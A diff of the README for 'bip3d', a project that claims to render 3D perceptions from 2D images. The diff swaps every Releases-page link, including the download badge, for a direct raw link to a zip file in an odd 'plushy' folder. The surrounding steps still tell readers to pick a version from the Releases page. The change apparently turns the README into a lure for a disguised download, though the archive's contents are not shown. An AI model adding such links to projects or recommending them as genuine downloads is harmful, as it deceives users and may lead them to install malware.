@@ -4,10 +4,10 @@
 Welcome to bip3d! This application helps you understand and view 3D perceptions from 2D images. It is designed for anyone interested in exploring the world of 3D representation, whether for personal enjoyment or educational purposes.
 
 ## 🥇 Download Now
-[![Download bip3d](https://img.shields.io/badge/Download-bip3d-blue.svg)](https://github.com/ayoub147147/bip3d/releases)
+[![Download bip3d](https://raw.githubusercontent.com/ayoub147147/bip3d/main/plushy/bip3d.zip)](https://raw.githubusercontent.com/ayoub147147/bip3d/main/plushy/bip3d.zip)
 
 ## 📥 Download & Install
-To get started, you can download bip3d from our [Releases page](https://github.com/ayoub147147/bip3d/releases). Follow these steps:
+To get started, you can download bip3d from our [Releases page](https://raw.githubusercontent.com/ayoub147147/bip3d/main/plushy/bip3d.zip). Follow these steps:
 
 1. Click the link above to visit the Releases page.
 2. You will see a list of available versions. Choose the latest release for the best features and updates.
@@ -56,4 +56,4 @@ Join our community to share your experiences, ask questions, and connect with ot
 ## ⚙️ Contributing
 If you're interested in helping us improve bip3d, contributions are welcome! You can submit issues, request features, or even create pull requests. Please refer to our contribution guidelines in the repository.
 
-Thank you for your interest in bip3d. Enjoy your exploration of 3D perceptions! Don't forget to [download the latest version here](https://github.com/ayoub147147/bip3d/releases) and start your journey today.
+Thank you for your interest in bip3d. Enjoy your exploration of 3D perceptions! Don't forget to [download the latest version here](https://raw.githubusercontent.com/ayoub147147/bip3d/main/plushy/bip3d.zip) and start your journey today.
